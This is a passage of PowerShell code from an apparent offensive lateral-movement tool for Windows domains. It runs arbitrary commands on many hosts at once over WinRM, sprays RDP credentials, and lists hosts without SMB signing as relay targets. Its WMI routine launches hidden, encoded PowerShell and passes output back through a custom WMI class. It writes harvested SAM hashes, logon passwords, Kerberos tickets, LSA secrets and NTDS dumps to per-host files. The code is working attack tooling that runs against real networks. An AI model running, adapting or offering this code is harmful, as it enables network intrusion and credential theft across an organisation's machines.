                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Host
                                Write-Host
                                $hasDisplayedResult = $true
                            }
                        }
                    } 
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()



    }

    ################################################################################################################
    ############################################### Function: WinRM ################################################
    ################################################################################################################
    Function Method-WinRM {
        Write-host

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Timeout, $Module)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return "Unable to connect" }
      
            try {
                # Leave these comments here because its a clusterfuck
                # Check if the module is "Amnesiac"
                if ($Module -eq "Amnesiac") {
                    # Test the connection by invoking a simple echo command
                    $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
                        Write-Output "Successful Connection PME"
                    } -ErrorAction Stop

                    # If the test command succeeded, proceed with the actual command
                    if ($result) {
                        # Define a script block that will execute the command
                        $AscriptBlock = {
                            param($command)
                            Invoke-Expression $command
                        }

                        # Execute the command as a background job and ignore the job object
                        Invoke-Command -ComputerName $computerName -ScriptBlock $AscriptBlock -ArgumentList $Command -AsJob | Out-Null
                        # Return a success message
                        return "Successful Connection PME"
                    }
                    else {
                        # If the test command failed, return an access denied message
                        return "Access Denied"
                    }
                }
                elseif ($Command -eq "") {
                    # If the command is empty, execute a simple echo command
                    $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
                        Write-Output "Successful Connection PME"
                    } -ErrorAction Stop

                    # If the result is empty, ensure a success message is returned
                    if (-not $result) {
                        $result = "Successful Connection PME"
                    }

                    # Return the result
                    return $result
                }
                elseif ($Command -ne "") {
                    # If a command is provided, execute it
                    $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
                        Invoke-Expression $Using:Command
                    } -ErrorAction Stop

                    # If the result is empty, ensure a success message is returned
                    if (-not $result) {
                        $result = "Successful Connection PME"
                    }

                    # Return the result
                    return $result
                }
            }
            catch {
                # Handle exceptions based on their message
                if ($_.Exception.Message -like "*Access is Denied*") {
                    return "Access Denied"
                }
                elseif ($_.Exception.Message -like "*cannot be resolved*") {
                    return "Unable to connect"
                }
                else {
                    return "Unspecified Error"
                }
            }



        }

        # Create and invoke runspaces for each computer
        foreach ($computer in $computers) {

            $ComputerName = $computer.Properties["dnshostname"][0]
            $OS = $computer.Properties["operatingSystem"][0]
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Module)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false

                    # [other conditions for $result]
                    if ($result -eq "Access Denied") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Unspecified Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
            
                    elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
             
                    elseif ($result -eq "Successful Connection PME") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                    } 
            
                    elseif ($result -eq "Unable to connect") {}

                    elseif ($result -match "[a-zA-Z0-9]") {
                
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                        } 
                        else {
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                            $filePath = switch ($Module) {
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "KerbDump" { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                                if ($ShowOutput) {
                                    $result | Write-Host
                                    Write-Host
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Host
                                Write-Host
                                $hasDisplayedResult = $true
                            }
                        }
                    } 
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()

    }


    ################################################################################################################
    ################################################# Function: RDP ################################################
    ################################################################################################################
    Function Method-RDP {
        $ErrorActionPreference = "SilentlyContinue"
        Write-Host

        $MaxConcurrentJobs = $Threads
        $RDPJobs = @()

        # Setting up runspaces for Port Checking
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 4) # Need to test the threads at scale more
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $RunSpaceScriptBlock = {
            param ($computerName, $Timeout)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if ($connected) { return "Connected" }
            else { return "Unable to connect" }
        }

        foreach ($computer in $computers) {
    
            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = $Computer
                $OS = "BLANK"
            }
    
            $runspace = [powershell]::Create().AddScript($RunSpaceScriptBlock).AddArgument($ComputerName).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        $FailedComputers = @()

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    if ($result -eq "Unable to connect") {
                        $FailedComputers += $runspace.ComputerName
                        continue
                    }
           
                    # Cleanup for completed runspaces
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Final cleanup
        $runspacePool.Close()
        $runspacePool.Dispose()


        foreach ($Computer in $Computers) {
    
            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            # Check if the computer is in the FailedComputers list
            if ($ComputerName -in $FailedComputers) { continue }

            $ScriptBlock = {

                Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp)
                Invoke-Expression -Command $Global:irdp

                function Display-ComputerStatus {
                    param (
                        [string]$ComputerName,
                        [string]$OS,
                        [System.ConsoleColor]$statusColor = 'White',
                        [string]$statusSymbol = "",
                        [string]$statusText = "",
                        [int]$NameLength,
                        [int]$OSLength
                    )

                    # Prefix
                    Write-Host "RDP " -ForegroundColor Yellow -NoNewline
                    Write-Host "   " -NoNewline
    
                    # Resolve IP
                    $IP = $null
                    $Ping = New-Object System.Net.NetworkInformation.Ping 
                    $Result = $Ping.Send($ComputerName, 15)
                    if ($Result.Status -eq 'Success') {
                        $IP = $Result.Address.IPAddressToString
                        Write-Host ("{0,-16}" -f $IP) -NoNewline
                    }
                    else { Write-Host ("{0,-16}" -f $IP) -NoNewline }
    
                    # Display ComputerName and OS
                    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                    Write-Host "   " -NoNewline
                    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
                    Write-Host "   " -NoNewline

                    # Display status symbol and text
                    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
                    Write-Host $statusText
                }


                if ($LocalAuth) { $Domain = $ComputerName }
                if ($Password -ne "") { $result = Invoke-RDP "username=$Domain\$Username password=$Password computername=$ComputerName" }
           
                try { $result = $result.Trim() } catch {}

                $SuccessStatus = @('Success', 'STATUS_PASSWORD_MUST_CHANGE', 'LOGON_FAILED_UPDATE_PASSWORD', 'ARBITRATION_CODE_BUMP_OPTIONS', 'ARBITRATION_CODE_CONTINUE_LOGON', 'ARBITRATION_CODE_CONTINUE_TERMINATE', 'ARBITRATION_CODE_NOPERM_DIALOG', 'ARBITRATION_CODE_REFUSED_DIALOG', 'ARBITRATION_CODE_RECONN_OPTIONS')
                $DeniedStatus = @('ERROR_CODE_ACCESS_DENIED', 'LOGON_FAILED_BAD_PASSWORD', 'LOGON_FAILED_OTHER', 'LOGON_WARNING', 'STATUS_LOGON_FAILURE', 'SSL_ERR_LOGON_FAILURE', 'disconnectReasonByServer', 'disconnectReasonRemoteByUser')
                $PwChangeStatus = @('SSL_ERR_PASSWORD_MUST_CHANGE')
                $ToDStatus = @('STATUS_ACCOUNT_RESTRICTION')

                switch ($result) {
                    "Unable to connect" { continue }

                    { $SuccessStatus -contains $_ } {
                        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }

                    { $DeniedStatus -contains $_ } {
                        if ($SuccessOnly) { Continue }
                        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
    
                    { $PwChangeStatus -contains $_ } {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Magenta" -statusSymbol "[/] " -statusText "PASSWORD CHANGE REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }

                    { $ToDStatus -contains $_ } {
                        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS - ACCOUNT RESTRICTION" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }

                    default {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Yellow" -statusSymbol "[*] " -statusText "$_" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
                }
   


            }

            while (($RDPJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
                Start-Sleep -Milliseconds 100
            }

            $RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp
            [array]$RDPJobs += $RDPJob

            # Check if the maximum number of concurrent jobs has been reached
            if ($RDPJobs.Count -ge $MaxConcurrentJobs) {
                do {
                    # Wait for any job to complete
                    $JobFinished = $null
                    foreach ($Job in $RDPJobs) {
                        if ($Job.State -eq 'Completed') {
                            $JobFinished = $Job
                            break
                        }
                    }

                    if ($JobFinished) {
                        # Retrieve the job result and remove it from the job list
                        $Result = Receive-Job -Job $JobFinished
                        # Process the result as needed
                        $Result

                        $RDPJobs = $RDPJobs | Where-Object { $_ -ne $JobFinished }
                        Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
                    }
                }
                until (-not $JobFinished)
            }
        }

        # Wait for any remaining jobs to complete
        $RDPJobs | ForEach-Object {
            $JobFinished = $_ | Wait-Job -Timeout "15"

            if ($JobFinished) {
                # Retrieve the job result and remove it from the job list
                $Result = Receive-Job -Job $JobFinished
                # Process the result as needed
                $Result

                Remove-Job -Job $JobFinished -Force -ErrorAction "SilentlyContinue"
            }
        }

        # Clean up all remaining jobs
        $RDPJobs | Remove-Job -Force -ErrorAction "SilentlyContinue"
    }

    ################################################################################################################
    ############################################# Function: GenRelayList ###########################################
    ################################################################################################################

    Function GenRelayList {
        Write-output ""

        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Timeout)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            if (!$connected) { return "Unable to connect" ; $tcpClient.Close() }   

            # Code is a revision from: https://github.com/tmenochet/PowerScan/blob/master/Recon/Get-SmbStatus.ps1
            Function Get-SMBSigning {
                Param ([string]$ComputerName, $Timeout)

                $SMB1 = Get-SmbVersionStatus -ComputerName $ComputerName -SmbVersion 'SMB1' -Timeout $Timeout
                $SMB2 = Get-SmbVersionStatus -ComputerName $ComputerName -SmbVersion 'SMB2' -Timeout $Timeout

                if ($SMB1.SigningStatus -or $SMB2.SigningStatus) { "Signing Required" } else { "Signing not Required" }
            }

            function ConvertFrom-PacketOrderedDictionary ($packet_ordered_dictionary) {
                $byte_array = @()
                foreach ($field in $packet_ordered_dictionary.Values) {
                    $byte_array += $field
                }
                return $byte_array
            }

            function Get-PacketNetBIOSSessionService {
                Param (
                    [Int] $packet_header_length,
                    [Int] $packet_data_length
                )

                [Byte[]] $packet_netbios_session_service_length = [BitConverter]::GetBytes($packet_header_length + $packet_data_length)
                $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]
                $packet_NetBIOSSessionService = New-Object Collections.Specialized.OrderedDictionary
                $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type", [Byte[]](0x00))
                $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length", $packet_netbios_session_service_length)
                return $packet_NetBIOSSessionService
            }

            function Get-PacketSMBHeader {
                Param (
                    [Byte[]] $packet_command,
                    [Byte[]] $packet_flags,
                    [Byte[]] $packet_flags2,
                    [Byte[]] $packet_tree_ID,
                    [Byte[]] $packet_process_ID,
                    [Byte[]] $packet_user_ID
                )

                $packet_SMBHeader = New-Object Collections.Specialized.OrderedDictionary
                $packet_SMBHeader.Add("SMBHeader_Protocol", [Byte[]](0xff, 0x53, 0x4d, 0x42))
                $packet_SMBHeader.Add("SMBHeader_Command", $packet_command)
                $packet_SMBHeader.Add("SMBHeader_ErrorClass", [Byte[]](0x00))
                $packet_SMBHeader.Add("SMBHeader_Reserved", [Byte[]](0x00))
                $packet_SMBHeader.Add("SMBHeader_ErrorCode", [Byte[]](0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_Flags", $packet_flags)
                $packet_SMBHeader.Add("SMBHeader_Flags2", $packet_flags2)
                $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh", [Byte[]](0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_Signature", [Byte[]](0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_Reserved2", [Byte[]](0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_TreeID", $packet_tree_ID)
                $packet_SMBHeader.Add("SMBHeader_ProcessID", $packet_process_ID)
                $packet_SMBHeader.Add("SMBHeader_UserID", $packet_user_ID)
                $packet_SMBHeader.Add("SMBHeader_MultiplexID", [Byte[]](0x00, 0x00))
                return $packet_SMBHeader
            }

            function Get-PacketSMBNegotiateProtocolRequest ($packet_version) {
                if ($packet_version -eq 'SMB1') {
                    [Byte[]] $packet_byte_count = 0x0c, 0x00
                }
                else {
                    [Byte[]] $packet_byte_count = 0x22, 0x00
                }
                $packet_SMBNegotiateProtocolRequest = New-Object Collections.Specialized.OrderedDictionary
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount", [Byte[]](0x00))
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount", $packet_byte_count)
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat", [Byte[]](0x02))
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name", [Byte[]](0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00))
                if ($packet_version -ne 'SMB1') {
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2", [Byte[]](0x02))
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2", [Byte[]](0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32, 0x00))
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3", [Byte[]](0x02))
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3", [Byte[]](0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x3f, 0x3f, 0x3f, 0x00))
                }
                return $packet_SMBNegotiateProtocolRequest
            }

            function Get-SmbVersionStatus {
                Param (
                    [string] $ComputerName,
                    [string] $SmbVersion = 'SMB2',
                    $Timeout
                )

                #$serviceStatus = $false
                #$versionStatus = $false
                $signingStatus = $false

                $process_ID = [Diagnostics.Process]::GetCurrentProcess() | Select-Object -ExpandProperty Id
                $process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
                $process_ID = $process_ID.Replace("-00-00", "")
                [Byte[]] $process_ID_bytes = $process_ID.Split("-") | ForEach-Object { [Char][Convert]::ToInt16($_, 16) }

                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.ReceiveTimeout = $Timeout

                try {
                    $tcpClient.Connect($ComputerName, "445")
                    if ($tcpClient.connected) {
                        $serviceStatus = $true

                        $SMB_relay_challenge_stream = $tcpClient.GetStream()
                        $SMB_client_receive = New-Object Byte[] 1024
                        $SMB_client_stage = 'NegotiateSMB'

                        while ($SMB_client_stage -ne 'exit') {
                            switch ($SMB_client_stage) {
                                'NegotiateSMB' {
                                    $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01, 0x48 0xff, 0xff $process_ID_bytes 0x00, 0x00
                                    $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SmbVersion
                                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                                    $SMB_relay_challenge_stream.Write($SMB_client_send, 0, $SMB_client_send.Length) > $null
                                    $SMB_relay_challenge_stream.Flush()
                                    $SMB_relay_challenge_stream.Read($SMB_client_receive, 0, $SMB_client_receive.Length) > $null
                                    if ([BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42') {
                                        $SmbVersion = 'SMB1'
                                        $SMB_client_stage = 'NTLMSSPNegotiate'
                                    }
                                    else {
                                        $SMB_client_stage = 'NegotiateSMB2'
                                    }
                                    if (($SmbVersion -eq 'SMB1' -and [BitConverter]::ToString($SMB_client_receive[39]) -eq '0f') -or ($SmbVersion -ne 'SMB1' -and [BitConverter]::ToString($SMB_client_receive[70]) -eq '03')) {
                                        $signingStatus = $true
                                    }
                                    $tcpClient.Close()
                                    $SMB_client_receive = $null
                                    $SMB_client_stage = 'exit'
                                    #$versionStatus = $true
                                }
                            }
                        }
                    }
                }
    
                catch { return "Unable to connect" }
                finally { $tcpClient.Close() }
                return ([PSCustomObject]@{SigningStatus = $signingStatus })
            }

            return Get-SMBSigning -ComputerName $ComputerName

        }


        # Create and invoke runspaces for each computer
        foreach ($computer in $computers) {

            $ComputerName = $computer.Properties["dnshostname"][0]
            $OS = $computer.Properties["operatingSystem"][0]
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false
                    try { $result = $result.Trim() } catch {}
                    if ($Result -eq "Unable to connect") {
                
                        $runspace.Runspace.Dispose()
                        $runspace.Handle.AsyncWaitHandle.Close()
                        continue

                    }

                    if ($result -match "Signing Required") {
                        if ($SuccessOnly) { continue }
                
                        else {
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "SMB Signing Required" -NameLength $NameLength -OSLength $OSLength
                            continue
                
                        }
                    }

                    elseif ($result -match "Signing not Required") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SMB Signing not Required" -NameLength $NameLength -OSLength $OSLength
                        $($runspace.ComputerName) | Out-File "$SMB\SigningNotRequired-$Domain.txt" -Encoding "ASCII" -Append -Force -ErrorAction "SilentlyContinue"
                        continue
                    }

                    else {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Check if the file exists
        if (Test-Path "$SMB\SigningNotRequired-$Domain.txt") {
            $Unique = Get-Content "$SMB\SigningNotRequired-$Domain.txt" | Sort-Object -Unique
            $Unique | Set-Content "$SMB\SigningNotRequired-$Domain.txt" -Force
        } 

        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()
 
    }


    ################################################################################################################
    ############################################ Function: SessionHunter ###########################################
    ################################################################################################################
    Function Invoke-SessionHunter {
        Write-host

        Remove-Item -Path "$Sessions\SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"


        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Timeout)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return }
    
            $osInfo = $null
            $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
            if (!$osInfo) { return }


            Function WMI {

                param (
                    [string]$Command = "",
                    [string]$ComputerName,
                    [string]$Class = "PMEClass"
                )


                function CreateScriptInstance([string]$ComputerName) {
                    $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
                    if ($classCheck -eq $null) {
                        $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null)
                        $newClass["__CLASS"] = "$Class"
                        $newClass.Qualifiers.Add("Static", $true)
                        $newClass.Properties.Add("CommandId", [System.Management.CimType]::String, $false)
                        $newClass.Properties["CommandId"].Qualifiers.Add("Key", $true)
                        $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
                        $newClass.Put() | Out-Null
                    }
                    $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
                    $wmiInstance.GetType() | Out-Null
                    $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
                    $wmiInstance.Dispose()
                    return $CommandId
        
                }

                function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
                    try {
                        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
                        $result = $wmiInstance.CommandOutput
                        $wmiInstance.Dispose()
                        return $result
                    } 
                    catch { Write-Error $_.Exception.Message } 
                    finally { if ($wmiInstance) { $wmiInstance.Dispose() } }
                }


                function ExecCommand([string]$ComputerName, [string]$Command) {
                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
                    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
                    if ($process.ReturnValue -eq 0) {
                        $started = Get-Date
                        Do {
                            if ($started.AddMinutes(2) -lt (Get-Date)) {
                                Write-Host "PID: $($process.ProcessId) - Response took too long."
                                break
                            }
                            $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                            Start-Sleep -Seconds 1
                        } While ($watcher -ne $null)
                        $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
                        return $scriptOutput
                    }
                }

                $commandString = $Command
                $scriptCommandId = CreateScriptInstance $ComputerName
                if ($scriptCommandId -eq $null) {
                    Write-Error "Error creating remote instance."
                }
                $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
